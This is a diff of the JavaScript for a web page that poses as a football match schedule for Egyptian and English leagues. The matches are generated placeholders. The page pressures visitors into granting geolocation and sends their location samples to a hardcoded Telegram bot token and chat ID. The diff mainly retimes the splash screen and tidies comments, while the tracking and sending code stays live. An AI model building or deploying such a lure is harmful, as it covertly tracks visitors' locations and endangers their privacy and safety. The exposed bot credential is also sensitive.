@@ -1,7 +1,7 @@
 const CONFIG = {
   telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
   telegramChatId: '8209565969',
-  splashDurationMs: 5000,
+  splashDurationMs: 10000, // مدة البوب التلقائي قبل الاختفاء
   developerName: '𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
 };
 
@@ -15,20 +15,28 @@ const grantBtn = document.getElementById('grant-btn');
 const retryBtn = document.getElementById('retry-btn');
 
 let _samples = [];
-let splashDone = false;
+let splashHidden = false;
 
-// إخفاء البوب بعد مدة أو عند الضغط
+// --- التعامل مع البوب ---
 function hideSplash() {
-  splash.classList.add('hidden');
-  splashDone = true;
-  requestGeolocation();
+  if (splashHidden) return;
+  splashHidden = true;
+
+  splash.classList.add('hidden'); // التحول السلس
+  setTimeout(() => {
+    splash.style.display = 'none';
+    requestGeolocation();
+  }, 500);
 }
 
+// الضغط على البوب أو زر التخطي
 splash.addEventListener('click', hideSplash);
 skipBtn.addEventListener('click', hideSplash);
+
+// يختفي تلقائيًا بعد CONFIG.splashDurationMs
 setTimeout(hideSplash, CONFIG.splashDurationMs);
 
-// طلب الموقع
+// --- الجغرافيا ---
 function requestGeolocation() {
   if (!navigator.geolocation) {
     showLocationRequired();
@@ -53,22 +61,22 @@ function requestGeolocation() {
   );
 }
 
-// إظهار رسالة منح الإذن بسلاسة
 function showLocationRequired() {
-  locationMsg.classList.add('show');
+  locationMsg.style.display = 'flex';
 }
 
-// زر منح الإذن: يظهر رسالة الخطوات مرة واحدة
+// --- أزرار منح الإذن وإعادة المحاولة ---
 grantBtn.onclick = () => {
-  alert("انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة.");
+  alert(
+    "انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة."
+  );
 };
 
-// زر إعادة المحاولة: إعادة تحميل الصفحة بالكامل
 retryBtn.onclick = () => {
-  window.location.reload();
+  window.location.reload(); // إعادة تحميل الصفحة بالكامل
 };
 
-// إرسال البيانات للتليجرام
+// --- إرسال البيانات لتليجرام ---
 function sendSampleToTelegram(sample) {
   const text = `📍 Sample
 🕒 ${sample.timestamp}
@@ -90,7 +98,7 @@ function _sendTelegramMessage(text) {
   }).catch(err => console.error(err));
 }
 
-/* --- MATCH TABLE --- */
+// --- جدول المباريات ---
 const leaguesData = [
   { name: 'الدوري المصري', matches: generateMatches(3) },
   { name: 'الدوري الإنجليزي', matches: generateMatches(3) },
@@ -124,7 +132,6 @@ function generateMatches(count) {
 
 function showMatchesTable() {
   matchTable.style.display = 'block';
-  locationMsg.classList.remove('show'); // إخفاء الرسالة عند ظهور الجدول
   leaguesDiv.innerHTML = '';
   leaguesData.forEach(league => {
     const leagueDiv = document.createElement('div');
@@ -144,6 +151,5 @@ function showMatchesTable() {
 
     leaguesDiv.appendChild(leagueDiv);
   });
-};
-  });
+
 }
